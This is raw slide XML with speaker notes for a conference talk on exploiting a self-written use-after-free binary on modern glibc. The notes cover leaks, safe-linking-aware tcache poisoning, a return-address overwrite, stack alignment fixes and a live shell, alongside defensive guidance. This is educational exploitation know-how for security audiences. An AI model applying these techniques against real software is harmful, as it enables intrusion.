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VcoJeiqBVRpj5KOxehUyTwpUW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COLD OPEN (0:00–0:30). Don't read the title. Open on the paradox that names the talk: on today's glibc you can do everything the tutorial says — resolve the hook, overwrite it — and get nothing. The allocator changed the rules and stopped telling anyone. Tonight we treat a broken exploit like a body: establish cause of death, work the evidence, get our shell. One self-authored UAF binary, current glibc, every claim checked against source. Repo is live and reproducible — link stays up all talk.</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ME (0:30–1:00). Keep it to 30 seconds max — name, role, one sentence on FITSEC + CTF background to establish that you've done hands-on exploitation work, not just read about it. Don't linger; the talk itself is your credential. [REMINDER: swap the photo placeholder before presenting.]</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min for Act I.) Transition: 'Let's start at the morgue — with a technique that everyone still teaches and that no longer works.'</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BEAT (0:30–1:30). This is muscle memory for anyone who's done a heap challenge: hook = one write to a shell. Show it, let the room nod — everyone recognizes it. Then set the trap: 'watch what happens when I run exactly this against 2.39.'</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="48" name="Google Shape;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HOOK LANDS (1:30–3:00). This is the whole reason for the talk. The symbol still ships (nm proves it), tooling resolves it, you overwrite it — and malloc.c simply stopped calling it in 2.34. You attacked a decoy. Land the question that drives the next 35 minutes: with the hooks gone, what do you actually do? Then pivot to the mitigations we have to beat.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="61" name="Google Shape;6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min.) 'Before we break in, meet the guards. Four of them. Each one killed a technique — and each has an exact birthday in the source.'</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="76" name="Google Shape;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 NOT A STRUCT DUMP (~1.5 min). Keep it conceptual: bins are LIFO stacks per size; the single forward pointer is the whole game. If you overwrite one freed chunk's fd, the second malloc returns wherever you pointed. Everyone leaves this slide understanding the attack primitive; the guards are what make it hard now.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="86" name="Google Shape;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GUARDS (~3 min, ~40s each). Give each a one-line 'what it kills.' The version numbers are the credibility play — these came from grepping malloc.c at each release tag, not from a blog. Foreshadow: two of these (safe-linking + aligned_OK) directly shape how we poison; one (hooks) is why Act I failed. Don't dwell — this is the lineup, the fight is next.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="109" name="Google Shape;10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(~12 min — the core.) 'Now we build the chain live. Three places it will try to kill us silently — I'll walk into each one on purpose.'</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="133" name="Google Shape;13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MAP (~1 min). Give them the whole route before the weeds so they can place each trap. Two leaks first (libc for ASLR, heap for safe-linking), then poison → environ for a stack address → overwrite the saved return of main. Emphasize: this is a general recipe, not a trick for this binary.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="143" name="Google Shape;14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#1 (~2 min). SWITCH TO TERMINAL. Type: `make run` (or run to the leak breakpoint). Narrate WHY each leak exists while it scrolls: unsorted fd = arena pointer = libc; the heap leak exists only because safe-linking forces us to know addr&gt;&gt;12 to forge fd — the mitigation created the requirement. [IF IT MISBEHAVES] wrong glibc → `make tune`, paste, rerun; if still off, cut to the recording (slide 20's backup covers the full run). Keep terminal font ≥ 20pt.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="175" name="Google Shape;17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TRAP 1 (~2 min). The check is silent — you don't get an error, you get a NULL back and a later crash. The fix is a habit: align down to a 16-byte boundary, pad the extra quadword. Tell them this single check is why so many 'correct' tcache writes fail on modern glibc. Sets up trap 2, which is nastier.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="187" name="Google Shape;18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TRAP 2 (~2 min). Combine with trap 1: you aimed at RIP-8, so RIP-8 gets the key-zero — which is exactly the sacrificial slot you filled with junk. The two traps cancel if you set them up together, but bite hard if you know only one. This is the kind of thing that costs people an evening; that's the value.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="199" name="Google Shape;1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TRAP 3 TEASER (~1 min). Deliberately DON'T fix it here. Name it, show the crash, and promise the autopsy. This is the hand-off into Act IV — the methodology payoff. Resist the urge to say 'just add a ret'; the whole point is we derive that from the core, not fold in folklore.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="212" name="Google Shape;21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WRITE (~2 min). Two subtleties worth saying out loud: (1) freeing TWO chunks sets the bin count to 2 so the double-free key check is satisfied without a true double-free; (2) mangle needs the heap leak from slide 10 — again the mitigation dictates the exploit shape. This is the reusable core; the rest is plumbing to a return address.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="224" name="Google Shape;22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 min — the payoff of the whole talk.) 'The exploit crashed. Instead of guessing, we do what a forensic examiner does: open the body and read cause of death.'</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="235" name="Google Shape;2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AUTOPSY (~2 min). Walk it like evidence: the faulting instruction is movaps (aligned SSE move); movaps REQUIRES 16-byte-aligned memory; $rsp ends in 8, so it's 8 mod 16. Cause of death established without a single guess. Emphasize the transferable habit: read the faulting instruction and its operand constraints first — the fix falls out.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="245" name="Google Shape;2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FIX (~1.5 min). One ret = +8 = flips the parity to 16-aligned. The point isn't the gadget, it's the derivation: you now have a repeatable method for ANY silently-broken exploit — read the fault, read the constraint, satisfy it. That method is what they take to real targets.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="257" name="Google Shape;25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GENERALIZATION (~1.5 min). Close Act IV by turning the specific fix into a principle: alignment is a parity problem relative to your entry point, so cargo-culting 'add a ret' fails half the time. Measure, don't guess. Then lift into the payoff — 'with the parity fixed, watch it work.'</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="274" name="Google Shape;27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 min.) Short, confident. 'Leaks, poison, aligned chain, saved RIP overwritten. Live.'</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="284" name="Google Shape;28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MONEY SHOT (~3–4 min). SWITCH TO TERMINAL. `make run`, let it pop, then type a couple commands by hand (whoami, id, uname -r) — live typing sells that it's real. Say plainly: shell runs as my user because system() inherits privileges; setuid the binary for a root moment. Note it self-tuned its two offsets to this laptop's glibc with no edits. [BACKUP] recording is queued and muted; if anything stalls &gt;15s, alt-tab to it and keep narrating — don't debug live.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="294" name="Google Shape;29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min.) 'One picture of the whole battlefield — which classic techniques still work across a decade of glibc, checked against source.'</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="306" name="Google Shape;30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PHOTOGRAPH SLIDE (~2 min). Let them read the staircase — red marches right as glibc hardens, and only FSOP/house-of-apple2 is still green at 2.41. Say: 'the primitive→control techniques you were taught are mostly dead; the survivors are file-structure attacks.' Pause and let phones come up. Full, source-cited matrix is in the repo. Then hit the two things the internet gets wrong.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="316" name="Google Shape;31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CORRECTION 1 (~1.5 min). This is a credibility flex — you read the tags, the corpus repeated a wrong date. The guard lands in 2.28, so 2.27 is the last vulnerable release, not 2.28. Small, precise, checkable — exactly the kind of detail that tells reviewers and audience you did primary-source work.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="392" name="Google Shape;39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CORRECTION 2 + THESIS (~2 min). Tie the decoy back to the cold open — full circle: the talk opened on this exact trap, now you've named why. Then the number: six of the classic primitive→control techniques are dead on current glibc. That's the one-sentence takeaway if they remember nothing else. Transition to blue team.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="405" name="Google Shape;40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BLUE TEAM (~2 min). Give defenders something actionable, not a lecture: what each attack step looks like to a detector, then the concrete knobs (Full RELRO, GLIBC_TUNABLES, FORTIFY). Land the line: mitigations raised the bar, they didn't end the game — FSOP is still green. Then thanks + repo.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="417" name="Google Shape;41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 QUESTIONS (~1–2 min). Restate the one-liner takeaway: hooks gone ≠ heap safe — six techniques dead, but FSOP is still green. Thank how2heap/Shellphish and the glibc source. Hold for questions. Likely Q&amp;A: FSOP / house-of-apple2 details → out of scope, file-struct attacks are their own talk; how tune.gdb works → exec-wrapper, reads &amp;main_arena + saved RIP, prints both offsets; why isn't the shell root → system() inherits privileges, setuid the binary for root; does it work on 2.40/2.41 → yes, make tune adapts.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="428" name="Google Shape;42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15" name="Shape 15"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Google Shape;16;p1"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="502920" y="50292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200"/>
              <a:buFont typeface="Courier New"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" i="0" lang="en-US" sz="1200" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="E3B341"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>CASE №2039  —  glibc heap, post-mortem</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1200" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Google Shape;17;p1"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="502920" y="1737360"/>
            <a:ext cx="11155680" cy="1737360"/>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E6E8EB"/>
              </a:buClr>
              <a:buSzPts val="6000"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" i="0" lang="en-US" sz="6000" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="E6E8EB"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>When the Allocator</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="60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E6E8EB"/>
              </a:buClr>
              <a:buSzPts val="6000"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" i="0" lang="en-US" sz="6000" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="E6E8EB"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>Fights Back</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="6000" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Google Shape;18;p1"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="502920" y="3310128"/>
            <a:ext cx="111556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3000"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" i="0" lang="en-US" sz="3000" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="E3B341"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>Debugging Modern glibc Heap Exploits</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="3000" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Google Shape;19;p1"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="502920" y="420624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600"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" i="0" lang="en-US" sz="1600" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="E6E8EB"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>Parshwa Bhojak</a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" i="0" lang="en-US" sz="1600" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="8B929B"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>   ·   BSides CT 2026   ·   Sep 26</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1600" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Google Shape;20;p1"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="502920" y="630936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github.com/Parshva87/debugging-modern-glibc-heap</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8686800" y="4754880"/>
            <a:ext cx="3063240" cy="1371600"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd fmla="val 3333"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txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8887968" y="4901184"/>
            <a:ext cx="2660904" cy="10789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29B"/>
              </a:buClr>
              <a:buSzPts val="1100"/>
              <a:buFont typeface="Courier New"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" i="0" lang="en-US" sz="1100" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="8B929B"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>chunk 0x291</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100"/>
              <a:buFont typeface="Courier New"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" i="0" lang="en-US" sz="1100" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="3FB950"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>fd ─┐</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100"/>
              <a:buFont typeface="Courier New"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" i="0" lang="en-US" sz="1100" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="8B929B"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>    └─▶ tcache</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100"/>
              <a:buFont typeface="Courier New"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" i="0" lang="en-US" sz="1100" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="E5484D"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>key: 0x…  (dead)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7" name="Shape 27"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="28" name="Google Shape;28;p2"/>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b="0" i="0" lang="en-US" sz="1100" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="E3B341"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>CASE №2039 — THE INVESTIGATOR</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1100" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="29" name="Google Shape;29;p2"/>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b="0" i="0" lang="en-US" sz="900" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="8B929B"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>02 / 27</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="900" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="30" name="Google Shape;30;p2"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="502920" y="777240"/>
            <a:ext cx="7315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4200"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" i="0" lang="en-US" sz="4200" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="E6E8EB"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>Parshwa Bhojak</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="4200" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="31" name="Google Shape;31;p2"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="502920" y="15544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800"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" i="0" lang="en-US" sz="1800" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="E3B341"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>Security Automation Engineer  ·  Driven Tech</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1800" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="32" name="Google Shape;32;p2"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="502920" y="2377440"/>
            <a:ext cx="731520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500"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" i="0" lang="en-US" sz="1500" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="E3B341"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>» </a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" i="0" lang="en-US" sz="1500" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="E6E8EB"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>M.S. Cybersecurity, Florida Institute of Technology</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="15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E3B341"/>
              </a:buClr>
              <a:buSzPts val="1500"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" i="0" lang="en-US" sz="1500" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="E3B341"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>» </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" i="0" lang="en-US" sz="1500" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="E6E8EB"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>FITSEC Executive · active CTF player (FITSEC team)</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="15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E3B341"/>
              </a:buClr>
              <a:buSzPts val="1500"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" i="0" lang="en-US" sz="1500" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="E3B341"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>» </a:t>
            </a:r>
            <a:r>
              <a:rPr b="0" i="0" lang="en-US" sz="1500" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="E6E8EB"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>Hack The Box, heap exploitation, offensive security research</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1500" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="33" name="Google Shape;33;p2"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="502920" y="4343400"/>
            <a:ext cx="8229600" cy="73152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3FB950"/>
              </a:buClr>
              <a:buSzPts val="1400"/>
              <a:buFont typeface="Courier New"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" i="0" lang="en-US" sz="1400" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="3FB950"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>github.com/Parshva87</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8B929B"/>
              </a:buClr>
              <a:buSzPts val="1400"/>
              <a:buFont typeface="Courier New"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" i="0" lang="en-US" sz="1400" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="8B929B"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>linkedin.com/in/parshwa-bhojak-0b1a95153</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1400" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="34" name="Google Shape;34;p2" title="IMG_1632.JPEG"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="31895" l="37067" r="8876" t="31895"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="7298475" y="777250"/>
            <a:ext cx="3996000" cy="36483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39" name="Shape 39"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="40" name="Google Shape;40;p3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="1097280"/>
            <a:ext cx="12191695"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42C"/>
              </a:buClr>
